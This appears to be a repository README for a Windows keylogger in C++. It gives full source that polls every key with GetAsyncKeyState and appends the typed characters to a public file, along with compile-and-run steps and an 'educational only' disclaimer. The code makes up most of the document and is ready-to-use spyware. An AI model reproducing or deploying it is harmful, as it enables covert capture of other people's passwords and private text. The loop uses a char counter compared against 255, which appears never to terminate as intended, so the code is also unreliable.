# Keylogger

This is a simple keylogger written in C++ that logs keystrokes to a file.

## Disclaimer

**This software is intended for educational purposes only. Unauthorized use of this software for malicious activities, such as spying on users or logging sensitive information without consent, is illegal and unethical. Use it responsibly and ensure you have permission to log keystrokes on any system.**

## Features

- Logs keystrokes to a file located at `C:\Users\Public\keylogger.txt`.
- Captures regular keys, special keys (Enter, Backspace, Tab), and handles Shift key for uppercase letters.

## Requirements

- Windows operating system.
- Visual Studio or any other C++ compiler compatible with Windows API.

## Installation

1. Clone or download the repository.
2. Open the project in your preferred C++ development environment.

## Usage

1. Compile the program using your C++ compiler.
2. Run the executable. It will start logging keystrokes to `C:\Users\Public\keylogger.txt`.

### Example

```powershell
g++ -o keylogger keylogger.cpp -luser32
./keylogger
```
### How It Works
The program opens a file keylogger.txt in append mode.
It uses GetAsyncKeyState to check the state of each key.
If a key is pressed, it translates the key code to the corresponding character, considering the Shift key state.
The character is then written to the file.
The program runs in an infinite loop with a short sleep interval to prevent high CPU usage.
Key Components

### keys Function
File Handling: Opens keylogger.txt in append mode.
Key State Tracking: Uses GetAsyncKeyState to detect key presses.
Shift Key Handling: Adjusts the keyboard state to consider the Shift key.
Key Code Translation: Converts virtual key codes to characters using ToUnicode.
File Writing: Logs the characters to the file.

### main Function
Simply calls the keys function to start logging.
Code
```cpp
#include <iostream>
#include <Windows.h>
#include <WinUser.h>

using namespace std;

void keys() {
    char c;
    HANDLE hFile;
    DWORD numberofbytes;
    LPCSTR file = "C:\\Users\\Public\\keylogger.txt";

    hFile = CreateFileA(file, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        cerr << "[-] Error in File Creating";
        return;
    }

    bool keyStates[256] = { false };

    while (true) {
        for (c = 8; c <= 255; c++) {
            SHORT keyState = GetAsyncKeyState(c);
            bool isKeyPressed = (keyState & 0x8000) != 0;
            if (isKeyPressed && !keyStates[(unsigned char)c]) {
                keyStates[(unsigned char)c] = true;

                // Determine if the Shift key is pressed
                bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

                // Translate virtual key code to character
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);
                if (isShiftPressed) {
                    keyboardState[VK_SHIFT] = 0x80;
                }
                else {
                    keyboardState[VK_SHIFT] = 0;
                }

                // Convert the virtual key code to a character
                WCHAR buffer[2] = { 0 };
                int result = ToUnicode(c, 0, keyboardState, buffer, 2, 0);
                char output;

                if (result > 0) {
                    output = static_cast<char>(buffer[0]);
                }
                else {
                    switch (c) {
                    case VK_RETURN:
                        output = '\n'; // Newline for Enter key
                        break;
                    case VK_BACK:
                        output = '\b'; // Backspace
                        break;
                    case VK_TAB:
                        output = '\t'; // Tab
                        break;
                    default:
                        output = '\0'; // Null character for unhandled keys
                    }
                }

                if (output != '\0') {
                    DWORD written;
                    WriteFile(hFile, &output, 1, &written, NULL);
                }
            }
            else if (!isKeyPressed) {
                keyStates[(unsigned char)c] = false;
            }
        }
        Sleep(10);  // To prevent high CPU usage
    }

    CloseHandle(hFile);
}

int main(int argc, char* argv[]) {
    keys();
    return 0;
}
```
## License
This project is licensed under the MIT License - see the LICENSE file for details.
